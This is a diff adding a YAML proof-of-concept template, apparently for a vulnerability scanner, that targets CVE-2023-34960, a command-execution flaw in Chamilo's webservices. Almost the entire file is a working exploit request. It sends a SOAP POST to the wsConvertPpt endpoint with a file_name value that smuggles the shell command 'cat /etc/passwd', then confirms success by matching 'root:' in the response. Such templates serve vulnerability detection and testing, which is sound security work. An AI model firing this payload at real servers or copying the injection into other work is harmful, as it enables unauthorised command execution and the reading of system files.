@@ -1,0 +1,28 @@
+id: poc-yaml-chamilo-webservices-rce
+info:
+  name: Chamilo webservices 命令执行漏洞（CVE-2023-34960)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2023-34960
+  finger: NS-ASG
+requests:
+- method: POST
+  path: /main/webservices/additional_webservices.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:ns1="{http://ip:port}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap"
+    xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0
+    xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key
+    xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{}`.pptx''|"
+    |cat /etc/passwd||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value
+    xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+    '
+  expression: status_code == 200 && contains(body,"<ns1:wsConvertPptResponse>") &&
+    contains(body,"root:") && contains(body,"sys:")
+variables: {}
+transport: http
